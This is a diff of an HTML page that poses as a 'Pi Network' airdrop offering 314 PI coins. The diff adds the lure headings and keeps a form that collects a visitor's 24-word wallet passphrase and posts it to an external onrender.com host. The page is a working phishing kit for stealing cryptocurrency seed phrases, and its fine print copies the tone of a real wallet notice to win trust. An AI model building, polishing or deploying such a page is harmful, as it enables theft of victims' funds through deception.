@@ -20,6 +20,7 @@
             min-height: 100vh;
             background-color: #f4f4f4;
             margin: 0;
+            overflow-x: hidden;
         }
 
         .container {
@@ -32,7 +33,41 @@
             text-align: center;
         }
 
-        h1 {
+        /* Header Styling */
+        .header {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            color: #ff7f50;
+            animation: glow 1.5s infinite;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .header h2 {
+            font-size: 18px;
+            color: #5a2da2;
+            font-weight: normal;
+            margin-top: 5px;
+        }
+
+        @keyframes glow {
+            0% {
+                text-shadow: 0 0 10px #ff7f50, 0 0 20px #ff7f50, 0 0 30px #ff4500, 0 0 40px #ff4500, 0 0 50px #ff4500;
+            }
+            50% {
+                text-shadow: 0 0 20px #ff4500, 0 0 30px #ff4500, 0 0 40px #ff7f50, 0 0 50px #ff7f50, 0 0 60px #ff4500;
+            }
+            100% {
+                text-shadow: 0 0 10px #ff4500, 0 0 20px #ff4500, 0 0 30px #ff4500, 0 0 40px #ff7f50, 0 0 50px #ff7f50;
+            }
+        }
+
+        /* Form Styling */
+        h3 {
             font-size: 22px;
             color: #5a2da2;
             margin-bottom: 20px;
@@ -64,6 +99,7 @@
             background-color: #4a2390;
         }
 
+        /* Info Text */
         .info-text {
             font-size: 12px;
             color: #555;
@@ -100,11 +136,20 @@
 </head>
 <body>
     <div class="container">
-        <h1>Unlock Pi Reward</h1>
+        <!-- Header Section -->
+        <div class="header">
+            <h1>Airdrop from Pi Network</h1>
+            <h2>Claim Your 314 PI Coins Now</h2>
+        </div>
+
+        <!-- Form Section -->
+        <h3>Unlock Pi Reward</h3>
         <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
             <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
             <button type="submit">Unlock with passphrase</button>
         </form>
+
+        <!-- Info Section -->
         <div class="info-text">
             As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase. <br><br>
             Lost your wallet passphrase? <a href="#">you can create a new wallet</a>, but all the Pi numbers in your previous wallet will be inaccessible.
